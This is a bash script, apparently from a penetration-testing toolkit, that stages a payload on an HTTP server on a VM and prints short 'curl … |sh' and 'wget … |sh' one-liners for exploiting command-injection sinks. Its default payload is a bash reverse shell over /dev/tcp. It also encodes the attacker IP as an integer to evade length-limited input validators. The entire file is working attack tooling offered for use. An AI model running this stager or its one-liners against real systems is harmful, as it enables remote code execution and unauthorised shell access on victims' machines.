#!/usr/bin/env bash
# Serve a command payload on the VM over an egress-friendly HTTP port and print the
# shortest fetch one-liners for a cmdi sink (the web_delivery pattern, without msf).
#
# Why: command-injection sinks with tight length caps (or egress-filtered targets) are
# exploited with a short fetch-and-run: `curl -sm2 <LHOST>/r|sh`. This starts the server
# (python3 http.server in a VM tmux session named `stager`) and prints the one-liner with
# the IPv4 pre-encoded as an integer (10 chars vs 15) to beat short validators.
#
# Usage: bash scripts/stager.sh <lhost> [port] [payload-file-or-command]
#   bash scripts/stager.sh 192.168.128.212                      # payload = bash revshell to <lhost>:443
#   bash scripts/stager.sh 192.168.128.212 80 'id > /tmp/pwned' # explicit port + command
#   bash scripts/stager.sh 192.168.128.212 80 /tmp/payload.sh   # serve a local file's contents
# VM_SH overridable (default /root/vm.sh, invoked via `bash` like vm-rsh.sh).
set -uo pipefail
VM_SH="${VM_SH:-/root/vm.sh}"
LHOST="${1:?usage: stager.sh <lhost> [port] [payload-file-or-command]}"
WANT_PORT="${2:-}"
PAYLOAD="${3:-}"
PORTS="80 443 53 8000 8080"
DEFAULT_RLPORT="443"

vm() { bash "$VM_SH" "$1"; }

# default payload: bash reverse shell back to <lhost>:443
if [ -z "$PAYLOAD" ]; then
  PAYLOAD="bash -c 'exec bash -i >&/dev/tcp/${LHOST}/${DEFAULT_RLPORT} 0>&1'"
elif [ -f "$PAYLOAD" ]; then
  PAYLOAD="$(cat "$PAYLOAD")"
fi

# pick the port: first FREE on the VM (one ssh call), unless the caller pinned one
if [ -n "$WANT_PORT" ]; then
  PORT="$WANT_PORT"
else
  LISTEN="$(vm "ss -ltn")" || { echo "stager: cannot reach VM via ${VM_SH}" >&2; exit 1; }
  PORT=""
  for p in $PORTS; do
    if ! grep -q ":${p} " <<<"$LISTEN"; then PORT="$p"; break; fi
  done
  if [ -z "$PORT" ]; then
    echo "stager: all egress-friendly ports busy (${PORTS}) - pass one explicitly" >&2
    exit 1
  fi
fi

# IPv4 -> integer (shorter payloads under length-capped validators)
IFS=. read -r A B C D <<<"$LHOST"
INT=$(( (A << 24) | (B << 16) | (C << 8) | D ))

vm "mkdir -p /tmp/stager-${PORT}" || { echo "stager: mkdir failed on VM" >&2; exit 1; }
vm "printf '%s' \"\$(echo '$(printf '%s' "$PAYLOAD" | base64 -w0)' | base64 -d)\" > /tmp/stager-${PORT}/r" \
  || { echo "stager: payload upload failed" >&2; exit 1; }
vm "tmux kill-session -t stager 2>/dev/null; tmux new-session -d -s stager 'cd /tmp/stager-${PORT} && python3 -m http.server ${PORT}'" \
  || { echo "stager: could not start server session" >&2; exit 1; }

echo "LHOST=${LHOST} (int form: ${INT})"
echo "PORT=${PORT}"
echo "one-liner (fits a 31-char cap): curl -sm2 ${INT}/r|sh"
echo "equivalents:                    curl -sm2 ${LHOST}/r|sh | wget -qO- ${INT}/r|sh"
echo "server: tmux session 'stager' on the VM (stop: bash ${VM_SH} 'tmux kill-session -t stager')"
